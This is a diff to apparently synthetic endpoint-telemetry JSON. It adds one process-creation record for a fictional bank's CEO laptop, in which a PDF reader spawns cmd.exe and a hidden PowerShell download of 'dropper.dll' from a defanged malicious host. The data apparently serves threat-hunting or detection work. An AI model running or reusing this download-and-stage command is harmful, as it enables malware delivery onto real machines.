@@ -83,7 +83,93 @@
 
   "ProcessUniqueId": "6540-2025-12-06T09:05:09Z",
   "InitiatingProcessUniqueId": "5920-2025-12-06T09:04:00ZZ"
+},
+  {
+  "Timestamp": "2025-12-06T09:05:11Z",
+  "DeviceId": "WIN11-LAPTOP-CEODEV-5566",
+  "DeviceName": "ceo-laptop01.grandbank.corp",
+  "ActionType": "ProcessCreated",
+
+  "FileName": "powershell.exe",
+  "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+
+  "SHA1": "2c4d3f889901ac9331e6b77e1ae5857a46b42dc3",
+  "SHA256": "b6c8e15a99457da311df1f18a2f9a330e2b9c1ceb18155269f59b3ce1c55fd96",
+  "MD5": "a7c80c7a0ed59850fa2d4d98a766df02",
+  "FileSize": 461312,
+
+  "ProcessVersionInfoCompanyName": "Microsoft Corporation",
+  "ProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
+  "ProcessVersionInfoProductVersion": "10.0.22631.2428",
+  "ProcessVersionInfoInternalFileName": "powershell",
+  "ProcessVersionInfoOriginalFileName": "PowerShell.EXE",
+  "ProcessVersionInfoFileDescription": "Windows PowerShell",
+
+  "ProcessId": 6678,
+  "ProcessCommandLine": "powershell -nop -w hidden -c Invoke-WebRequest https://malicious-update-storage.eastus.cloudapp[.]azure.com/dropper.dll -OutFile C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll",
+  "ProcessIntegrityLevel": "Medium",
+  "ProcessTokenElevation": "TokenElevationTypeLimited",
+  "ProcessCreationTime": "2025-12-06T09:05:11Z",
+
+  "AccountDomain": "GRANDBANK",
+  "AccountName": "richard.sterling",
+  "AccountSid": "user-sid-12345",
+  "AccountUpn": "richard.sterling@grandbank.corp",
+  "AccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+  "LogonId": 113245,
+
+  "InitiatingProcessAccountDomain": "GRANDBANK",
+  "InitiatingProcessAccountName": "richard.sterling",
+  "InitiatingProcessAccountSid": "user-sid-12345",
+  "InitiatingProcessAccountUpn": "richard.sterling@grandbank.corp",
+  "InitiatingProcessAccountObjectId": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+  "InitiatingProcessLogonId": 113245,
+  "InitiatingProcessIntegrityLevel": "Medium",
+  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
+
+  "InitiatingProcessSHA1": "9a7d5f1b8d21431e81e888e98a037ef1293c5db4",
+  "InitiatingProcessSHA256": "",
+  "InitiatingProcessMD5": "3b4f8c21edab51ff72d2655fdde53312",
+
+  "InitiatingProcessFileName": "cmd.exe",
+  "InitiatingProcessFileSize": 289792,
+  "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
+  "InitiatingProcessVersionInfoProductName": "Microsoft® Windows® Operating System",
+  "InitiatingProcessVersionInfoProductVersion": "10.0.22631.2428",
+  "InitiatingProcessVersionInfoInternalFileName": "cmd",
+  "InitiatingProcessVersionInfoOriginalFileName": "Cmd.Exe",
+  "InitiatingProcessVersionInfoFileDescription": "Windows Command Processor",
+
+  "InitiatingProcessId": 6540,
+  "InitiatingProcessCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden -c Invoke-WebRequest https://malicious-update-storage.eastus.cloudapp[.]azure.com/dropper.dll -OutFile C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll",
+  "InitiatingProcessCreationTime": "2025-12-06T09:05:09Z",
+  "InitiatingProcessFolderPath": "C:\\Windows\\System32\\",
+
+  "InitiatingProcessParentId": 5920,
+  "InitiatingProcessParentFileName": "AcroRd32.exe",
+  "InitiatingProcessParentCreationTime": "2025-12-06T09:04:00Z",
+
+  "InitiatingProcessSignerType": "Signed",
+  "InitiatingProcessSignatureStatus": "Valid",
+
+  "ReportId": 894456,
+  "AppGuardContainerId": "",
+  "AdditionalFields": "[{\"NetworkMessageId\": \"source-record-id-5555\"}, {\"AttachmentSHA256\": \"4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6\"}]",
+
+  "InitiatingProcessSessionId": 2,
+  "IsInitiatingProcessRemoteSession": false,
+  "InitiatingProcessRemoteSessionDeviceName": "",
+  "InitiatingProcessRemoteSessionIP": "",
+
+  "CreatedProcessSessionId": 2,
+  "IsProcessRemoteSession": false,
+  "ProcessRemoteSessionDeviceName": "",
+  "ProcessRemoteSessionIP": "",
+
+  "ProcessUniqueId": "6678-2025-12-06T09:05:11Z",
+  "InitiatingProcessUniqueId": "6540-2025-12-06T09:05:09Z"
 }
+
 ,
 {
   "Timestamp": "2025-12-06T09:06:12Z",
